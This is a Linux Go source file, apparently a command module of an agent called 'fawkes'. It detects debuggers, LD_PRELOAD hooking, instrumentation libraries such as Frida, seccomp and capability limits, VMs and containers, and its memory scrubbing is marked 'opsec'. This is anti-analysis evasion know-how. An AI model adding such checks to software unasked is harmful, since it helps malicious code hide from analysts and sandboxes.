//go:build linux

package commands

import (
	"fmt"
	"os"
	"strconv"
	"strings"

	"fawkes/pkg/structs"
)

// runPlatformDebugChecks runs Linux-specific anti-debug checks.
func runPlatformDebugChecks() []debugCheck {
	var checks []debugCheck

	checks = append(checks, checkTracerPid())
	checks = append(checks, checkLdPreload())
	checks = append(checks, checkProcMaps())
	checks = append(checks, checkProcStatus())
	checks = append(checks, checkSandboxIndicators())

	return checks
}

// checkTracerPid reads /proc/self/status for TracerPid field.
// A non-zero TracerPid means a debugger (GDB, strace, ltrace) is attached via ptrace.
func checkTracerPid() debugCheck {
	data, err := os.ReadFile("/proc/self/status")
	if err != nil {
		return debugCheck{Name: "TracerPid (/proc/self/status)", Status: "ERROR", Details: fmt.Sprintf("Failed to read: %v", err)}
	}
	defer structs.ZeroBytes(data) // opsec

	for _, line := range strings.Split(string(data), "\n") {
		if strings.HasPrefix(line, "TracerPid:") {
			parts := strings.SplitN(line, ":", 2)
			if len(parts) == 2 {
				pidStr := strings.TrimSpace(parts[1])
				pid, _ := strconv.Atoi(pidStr)
				if pid > 0 {
					return debugCheck{
						Name:    "TracerPid (/proc/self/status)",
						Status:  "DETECTED",
						Details: fmt.Sprintf("Traced by PID %d", pid),
					}
				}
				return debugCheck{Name: "TracerPid (/proc/self/status)", Status: "CLEAN", Details: "TracerPid: 0"}
			}
		}
	}

	return debugCheck{Name: "TracerPid (/proc/self/status)", Status: "ERROR", Details: "TracerPid field not found"}
}

// checkLdPreload checks for LD_PRELOAD environment variable which may indicate library injection/hooking.
func checkLdPreload() debugCheck {
	val := os.Getenv("LD_PRELOAD")
	if val != "" {
		return debugCheck{
			Name:    "LD_PRELOAD",
			Status:  "WARNING",
			Details: fmt.Sprintf("Set: %s", val),
		}
	}
	return debugCheck{Name: "LD_PRELOAD", Status: "CLEAN", Details: "Not set"}
}

// suspiciousLibPatterns maps library name patterns to their tool descriptions.
var suspiciousLibPatterns = []struct {
	pattern string
	tool    string
}{
	{"frida", "Frida (dynamic instrumentation)"},
	{"valgrind", "Valgrind (memory analysis)"},
	{"libasan", "AddressSanitizer"},
	{"libtsan", "ThreadSanitizer"},
	{"libubsan", "UndefinedBehaviorSanitizer"},
	{"libmsan", "MemorySanitizer"},
	{"pin/", "Intel Pin (binary instrumentation)"},
	{"dynamorio", "DynamoRIO (binary instrumentation)"},
	{"qbdi", "QBDI (instrumentation)"},
}

// scanMapsForInstrumentation scans memory map lines for suspicious libraries.
// Returns deduplicated list of detected tool descriptions.
func scanMapsForInstrumentation(data string) []string {
	var found []string
	for _, line := range strings.Split(data, "\n") {
		lower := strings.ToLower(line)
		for _, s := range suspiciousLibPatterns {
			if strings.Contains(lower, s.pattern) {
				found = append(found, s.tool)
				break
			}
		}
	}

	// Deduplicate
	seen := make(map[string]bool)
	var unique []string
	for _, f := range found {
		if !seen[f] {
			seen[f] = true
			unique = append(unique, f)
		}
	}
	return unique
}

// checkProcMaps scans /proc/self/maps for suspicious shared libraries
// indicating dynamic instrumentation (Frida, Valgrind) or sanitizers.
func checkProcMaps() debugCheck {
	data, err := os.ReadFile("/proc/self/maps")
	if err != nil {
		return debugCheck{Name: "Memory Maps (/proc/self/maps)", Status: "ERROR", Details: fmt.Sprintf("Failed to read: %v", err)}
	}
	defer structs.ZeroBytes(data) // opsec: memory maps reveal loaded libraries

	content := string(data)
	found := scanMapsForInstrumentation(content)
	lines := strings.Split(content, "\n")

	if len(found) > 0 {
		return debugCheck{
			Name:    "Memory Maps (/proc/self/maps)",
			Status:  "DETECTED",
			Details: fmt.Sprintf("Suspicious libraries: %s", strings.Join(found, ", ")),
		}
	}
	return debugCheck{Name: "Memory Maps (/proc/self/maps)", Status: "CLEAN", Details: fmt.Sprintf("Scanned %d mappings, no instrumentation libs", len(lines))}
}

// parseProcStatusWarnings parses /proc/self/status content for security indicators.
// Returns a list of warning strings for detected sandbox/container indicators.
func parseProcStatusWarnings(data string) []string {
	var warnings []string
	for _, line := range strings.Split(data, "\n") {
		if strings.HasPrefix(line, "Seccomp:") {
			parts := strings.SplitN(line, ":", 2)
			if len(parts) == 2 {
				val := strings.TrimSpace(parts[1])
				switch val {
				case "1":
					warnings = append(warnings, "Seccomp strict mode (sandbox)")
				case "2":
					warnings = append(warnings, "Seccomp filter mode (sandbox/container)")
				}
			}
		}
		if strings.HasPrefix(line, "CapEff:") {
			parts := strings.SplitN(line, ":", 2)
			if len(parts) == 2 {
				val := strings.TrimSpace(parts[1])
				if val == "0000000000000000" {
					warnings = append(warnings, "Zero effective capabilities (restricted/sandboxed)")
				}
			}
		}
	}
	return warnings
}

// checkProcStatus reads additional debug indicators from /proc/self/status:
// - Seccomp mode (may indicate sandbox)
// - CapEff (all-zero effective capabilities suggest container/drop)
func checkProcStatus() debugCheck {
	data, err := os.ReadFile("/proc/self/status")
	if err != nil {
		return debugCheck{Name: "Process Status", Status: "ERROR", Details: fmt.Sprintf("Failed to read: %v", err)}
	}
	defer structs.ZeroBytes(data) // opsec

	warnings := parseProcStatusWarnings(string(data))

	if len(warnings) > 0 {
		return debugCheck{
			Name:    "Process Status (/proc/self/status)",
			Status:  "WARNING",
			Details: strings.Join(warnings, "; "),
		}
	}
	return debugCheck{Name: "Process Status (/proc/self/status)", Status: "CLEAN", Details: "Normal capabilities and seccomp state"}
}

// classifyDMIProduct classifies a DMI product name as a VM type.
// Returns the VM type description or empty string if not recognized.
func classifyDMIProduct(productName string) string {
	lower := strings.ToLower(productName)
	if strings.Contains(lower, "virtualbox") {
		return "VirtualBox (DMI)"
	} else if strings.Contains(lower, "vmware") {
		return "VMware (DMI)"
	} else if strings.Contains(lower, "kvm") || strings.Contains(lower, "qemu") {
		return "KVM/QEMU (DMI)"
	} else if strings.Contains(lower, "hyper-v") || strings.Contains(lower, "virtual machine") {
		return "Hyper-V (DMI)"
	} else if strings.Contains(lower, "xen") {
		return "Xen (DMI)"
	}
	return ""
}

// checkSandboxIndicators checks for common VM/sandbox indicators via procfs.
func checkSandboxIndicators() debugCheck {
	var indicators []string

	// Check for hypervisor flag in /proc/cpuinfo
	if data, err := os.ReadFile("/proc/cpuinfo"); err == nil {
		content := string(data)
		structs.ZeroBytes(data) // opsec
		if strings.Contains(content, "hypervisor") {
			indicators = append(indicators, "hypervisor CPU flag (VM)")
		}
	}

	// Check DMI product name for VM indicators
	productName := strings.TrimSpace(readFileQuiet("/sys/class/dmi/id/product_name"))
	if vm := classifyDMIProduct(productName); vm != "" {
		indicators = append(indicators, vm)
	}

	// Check for container indicators
	if _, err := os.Stat("/.dockerenv"); err == nil {
		indicators = append(indicators, "Docker container")
	}
	if _, err := os.Stat("/run/.containerenv"); err == nil {
		indicators = append(indicators, "Container runtime")
	}

	if len(indicators) > 0 {
		return debugCheck{
			Name:    "VM/Sandbox Detection",
			Status:  "WARNING",
			Details: strings.Join(indicators, "; "),
		}
	}
	return debugCheck{Name: "VM/Sandbox Detection", Status: "CLEAN", Details: "No VM/sandbox indicators found"}
}

